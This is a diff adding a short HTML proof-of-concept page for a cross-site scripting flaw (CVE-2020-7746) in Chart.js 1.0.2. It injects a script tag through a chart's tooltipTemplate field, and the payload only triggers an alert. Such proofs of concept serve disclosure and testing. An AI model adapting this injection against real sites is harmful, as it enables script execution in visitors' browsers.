@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Chart.js 1.0.2 XSS PoC</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/1.0.2/Chart.min.js"></script>
+</head>
+<body>
+  <h2>PoC for CVE-2020-7746 - Chart.js v1.0.2</h2>
+  <canvas id="myChart" width="400" height="200"></canvas>
+  <script>
+    var ctx = document.getElementById("myChart").getContext("2d");
+
+    var data = {
+      labels: ["Red", "Blue", "Yellow"],
+      datasets: [{
+        label: "Malicious Dataset",
+        data: [12, 19, 3],
+        tooltipTemplate: "<script>alert('XSS by tooltipTemplate')</script>"
+      }]
+    };
+
+    var myBarChart = new Chart(ctx).Bar(data);
+  </script>
+</body>
+</html>
